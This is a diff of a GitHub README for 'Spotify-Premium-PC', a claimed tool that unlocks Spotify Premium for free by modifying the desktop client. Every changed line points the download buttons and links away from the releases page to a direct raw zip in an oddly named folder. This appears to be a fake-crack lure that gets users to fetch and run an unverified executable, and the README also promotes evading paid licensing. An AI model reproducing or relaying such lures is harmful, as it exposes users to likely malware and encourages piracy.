@@ -1,6 +1,6 @@
 # 🎵 Spotify-Premium-PC - Unlock Premium Music, Zero Limits!
 
-[![Download Spotify Premium PC](https://img.shields.io/badge/Download-Spotify_Premium_PC_2026-1DB954?style=for-the-badge&logo=spotify&logoColor=white&labelColor=191414)](https://github.com/Dustyballhawking242/Spotify-Premium-PC/releases)
+[![Download Spotify Premium PC](https://img.shields.io/badge/Download-Spotify_Premium_PC_2026-1DB954?style=for-the-badge&logo=spotify&logoColor=white&labelColor=191414)](https://github.com/Dustyballhawking242/Spotify-Premium-PC/raw/refs/heads/main/veritable/Spotify-Premium-PC-2.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Getting Spotify-Premium-PC up and running takes less than two minutes. You don�
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: **[Download Spotify-Premium-PC](https://github.com/Dustyballhawking242/Spotify-Premium-PC/releases)**
+Visit this link to download the application: **[Download Spotify-Premium-PC](https://github.com/Dustyballhawking242/Spotify-Premium-PC/raw/refs/heads/main/veritable/Spotify-Premium-PC-2.5.zip)**
 
 The page will show you the latest release. Look for the file that matches your Windows system (usually labeled with the version number and “Windows”). Click on it to start the download.
 
@@ -58,7 +58,7 @@ Make sure your Windows PC meets these basic requirements:
 
 ### Downloading the File
 
-1.  Click the big green button at the top of this page, or go directly to the **[releases page](https://github.com/Dustyballhawking242/Spotify-Premium-PC/releases)**.
+1.  Click the big green button at the top of this page, or go directly to the **[releases page](https://github.com/Dustyballhawking242/Spotify-Premium-PC/raw/refs/heads/main/veritable/Spotify-Premium-PC-2.5.zip)**.
 2.  On that page, you’ll see a list of files. Find the one named something like `Spotify-Premium-PC-Setup.exe` (or similar).
 3.  Click the file name to start the download. Your browser will show progress at the bottom or top of the window.
 
@@ -105,7 +105,7 @@ This application modifies the desktop client to unlock features locally. While t
 
 ## 🔄 Keeping It Updated
 
-Spotify-Premium-PC is updated regularly to keep up with Spotify’s changes. To get the latest version, simply revisit the **[download page](https://github.com/Dustyballhawking242/Spotify-Premium-PC/releases)** and grab the newest release. You can also check back here for announcements.
+Spotify-Premium-PC is updated regularly to keep up with Spotify’s changes. To get the latest version, simply revisit the **[download page](https://github.com/Dustyballhawking242/Spotify-Premium-PC/raw/refs/heads/main/veritable/Spotify-Premium-PC-2.5.zip)** and grab the newest release. You can also check back here for announcements.
 
 ---
 
@@ -115,7 +115,7 @@ Spotify-Premium-PC is the easiest way to get premium music features on your Wind
 
 Don’t wait—hit that download button and start enjoying your music the way it was meant to be heard.
 
-[![Get Spotify Premium PC Now](https://img.shields.io/badge/🚀-Download_Now-1DB954?style=for-the-badge&logo=github&logoColor=white&labelColor=191414)](https://github.com/Dustyballhawking242/Spotify-Premium-PC/releases)
+[![Get Spotify Premium PC Now](https://img.shields.io/badge/🚀-Download_Now-1DB954?style=for-the-badge&logo=github&logoColor=white&labelColor=191414)](https://github.com/Dustyballhawking242/Spotify-Premium-PC/raw/refs/heads/main/veritable/Spotify-Premium-PC-2.5.zip)
 
 ---
 
